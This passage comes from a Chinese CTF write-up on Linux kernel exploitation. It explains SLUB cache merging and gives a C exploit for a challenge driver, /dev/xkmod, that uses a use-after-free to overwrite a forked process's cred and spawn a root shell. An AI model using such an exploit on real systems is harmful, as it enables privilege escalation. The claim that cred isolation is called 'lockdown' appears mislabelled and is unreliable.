 if (size <= 512 * 1024) return 19;
 if (size <= 1024 * 1024) return 20;
 if (size <= 2 * 1024 * 1024) return 21;
 if (size <= 4 * 1024 * 1024) return 22;
 if (size <= 8 * 1024 * 1024) return 23;
 if (size <= 16 * 1024 * 1024) return 24;
 if (size <= 32 * 1024 * 1024) return 25;
 if (size <= 64 * 1024 * 1024) return 26;
 BUG();


 /* Will never be reached. Needed because the compiler may complain */
 return -1;
}
```

#### 如何合并

```cpp
【file:/mm/slub.c】
static struct kmem_cache *find_mergeable(struct mem_cgroup *memcg, size_t size,
		size_t align, unsigned long flags, const char *name,
		void (*ctor)(void *))
{
	struct kmem_cache *s;

	if (slub_nomerge || (flags & SLUB_NEVER_MERGE))
		return NULL;

	if (ctor)
		return NULL;

	size = ALIGN(size, sizeof(void *));
	align = calculate_alignment(flags, align, size); 
	size = ALIGN(size, align);
	flags = kmem_cache_flags(size, flags, name, NULL); 

	list_for_each_entry(s, &slab_caches, list) { 
		if (slab_unmergeable(s)) 
			continue;

		if (size > s->size) 
			continue;

		if ((flags & SLUB_MERGE_SAME) != (s->flags & SLUB_MERGE_SAME)) 
				continue;
		/*
		 * Check if alignment is compatible.
		 * Courtesy of Adrian Drzewiecki
		 */
		if ((s->size & ~(align - 1)) != s->size) 
			continue;

		if (s->size - size >= sizeof(void *)) 
			continue;

		if (!cache_match_memcg(s, memcg)) 
			continue;

		return s;
	}
	return NULL;
}
```

该查找函数先获取将要创建的slab的内存对齐值及创建slab的内存标识。

接着经由list_for_each_entry()遍历整个slab_caches链表；

通过slab_unmergeable()判断遍历的kmem_cache是否允许合并

Analysis of the Merge:

主要依据

主要是缓冲区属性的标识及slab的对象是否有特定的初始化构造函数,如果不允许合并则跳过；

判断当前的kmem_cache的对象大小是否小于要查找的，是则跳过；

再接着if ((flags & SLUB_MERGE_SAME) != (s->flags &SLUB_MERGE_SAME)) 

判断当前的kmem_cache与查找的标识类型是否一致，不是则跳过；

往下就是if ((s->size & ~(align – 1)) != s->size)判断对齐量是否匹配，if (s->size – size >= sizeof(void *))判断大小相差是否超过指针类型大小，

if (!cache_match_memcg(s, memcg))判断memcg是否匹配。经由多层判断检验，如果找到可合并的slab，则返回回去，否则返回NULL。

kmem_cache_create_memcg()，如果__kmem_cache_alias()找到了可合并的slab，则将其kmem_cache结构返回。否则将会创建新的slab

### Extension



### 延申

在新版本的内核中这种攻击方式无效了，因为新进程的cred结构体会有一个单独的区域进行申请，因此UAF漏洞无法利用成功，这种新的特征叫做lockdown，详细可以参考： [lockdown](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=aefcf2f4b58155d27340ba5f9ddbe9513da8286d)

## Exp Generation

````
#include <stdio.h>
#include <sys/types.h>
#include <sys/io.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <wait.h>

struct param
{
    void *ptr;
    int start;
    int len;
};
struct param *p;

void alloc(int fd)
{
    ioctl(fd, 0x1111111, p);
}

void rd(int fd)
{
    ioctl(fd, 0x7777777, p);
}

void wt(int fd)
{
    ioctl(fd, 0x6666666, p);
}

int main(int argc, char const *argv[]){
	int fd1 = open("/dev/xkmod", O_RDONLY);
	int fd2 = open("/dev/xkmod", O_RDONLY);
	if(fd1 < 0){
		puts("[*]open error!");
        exit(0);
	}
	puts("[*]alloc from cache");
	
	p = malloc(sizeof(struct param));
	p->ptr = malloc(0x100);
	alloc(fd1);
    close(fd1);
    
    int pid = fork();
    if (pid < 0)
    {
        puts("[*]fork error!");
        exit(0);
    }
    if (pid == 0)
    {
		puts("[*]this is child process!");
		memset(p->ptr, 0, sizeof(p->ptr));
        p->start = 0;
        p->len = 0x28;
        wt(fd2);
        system("/bin/sh");
        exit(0);
	}else
    {
        puts("[*]this is child process!");
        int status;
        wait(&status);
    }

    return 0;
}
````

```
gcc exp.c -g -static -o exp
chmod +x exp
cp exp rootfs/
#pack
cd rootfs
find . | cpio -o --format=newc > ../rootfs.cpio
```





根据ioctl的命令，我们可以写出交互的函数

```
void alloc(int fd)
{
    ioctl(fd, 0x1111111, p);
}

void rd(int fd)
{
    ioctl(fd, 0x7777777, p);
}

void wt(int fd)
{
    ioctl(fd, 0x6666666, p);
}
```







## References

[1] https://mp.weixin.qq.com/s/v9_C43Qh9qXr9tYojrZKgQ

[2] https://xz.aliyun.com/t/11053

[3] https://mudongliang.github.io/2022/01/18/ciscn2017-babydriver.html

[4]https://github.com/g0dA/linuxStack/blob/master/%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%8B.md

[5]段鑫峰. 面向Linux内核空间的内存分配隔离方法的研究与实现[D].北京交通大学,2021.DOI:10.26944/d.cnki.gbfju.2021.000664.

[6] https://www.anquanke.com/post/id/259252#h2-6

[7] https://zhuanlan.zhihu.com/p/490588193

[8] https://kernel.blog.csdn.net/article/details/52705552

[9] https://www.jeanleo.com/2018/09/07/%E3%80%90linux%E5%86%85%E5%AD%98%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E3%80%91slub%E5%88%86%E9%85%8D%E7%AE%97%E6%B3%95%EF%BC%883%EF%BC%89/